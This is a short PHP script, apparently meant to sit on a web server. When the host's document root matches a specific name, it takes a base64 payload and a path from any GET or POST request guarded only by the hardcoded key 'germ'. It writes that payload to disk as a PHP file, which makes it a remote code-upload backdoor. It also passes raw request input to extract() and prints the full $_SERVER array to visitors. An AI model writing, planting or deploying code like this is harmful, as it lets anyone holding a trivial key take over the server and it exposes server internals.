<?php
if (preg_match('/silve312/', $_SERVER["DOCUMENT_ROOT"])) {
    extract($_GET);
    extract($_POST);
    $mode = "remote";
    header("Access-Control-Allow-Origin: *");
    header("Content-Type: text/plain; charset=utf-8");
    if ($key !== "germ") {
        echo "not allowed g";
        exit;
    }
    if ($path && $file) {
        $path = str_replace(".smc", ".php", $path);
        file_put_contents($path, base64_decode($file));
        echo "Put $path successful.\n";
    } else {
        echo "not allowed p";
    }
    exit;
} else {
    $mode = "local";
}

extract($_GET);
extract($_POST);
echo "<pre>";
echo "$mode\n\n";
print_r($_SERVER);
